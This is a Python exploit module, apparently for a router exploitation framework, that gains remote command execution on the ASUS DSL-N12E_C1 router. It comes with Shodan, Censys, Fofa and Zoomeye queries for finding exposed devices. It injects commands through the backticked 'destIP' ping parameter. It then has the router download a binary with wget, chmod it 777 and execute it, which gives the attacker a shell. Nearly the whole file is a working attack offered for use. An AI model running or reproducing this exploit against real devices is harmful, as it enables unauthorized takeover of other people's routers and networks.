'''
Exploit description: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution
Exploit link: https://www.exploit-db.com/exploits/45135

Zoomeye search: title:"DSL-N12E_C1"
Shodan search: title:"DSL-N12E_C1"
Fofa search: title="DSL-N12E_C1"
Censys search: services.http.response.html_title:"DSL-N12E_C1"
'''

from routersploit.core.exploit import shell
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.printer import log
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        'name': 'ASUS DSL-N12E_C1 RCE',
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def execute(self, cmd: str) -> str:
        self.http_request(
            method="GET",
            path='/Main_Analysis_Content.asp',
            params={
                'current_page': 'Main_Analysis_Content.asp',
                'next_page': 'Main_Analysis_Content.asp',
                'next_host': 'www.target.com',
                'group_id': '',
                'modified': '0',
                'action_mode': '+Refresh+',
                'action_script': '',
                'action_wait': '',
                'first_time': '',
                'applyFlag': '1',
                'preferred_lang': 'EN',
                'firmver': '1.1.2.3_345-g987b580',
                'cmdMethod': 'ping',
                'destIP': f'`{cmd}`',
                'pingCNT': '5'
            }
        )
        return ''

    def check(self) -> bool:
        response = self.http_request(method="GET", path="/Main_Analysis_Content.asp")
        if response and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            shell(
                self,
                architecture="armle",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
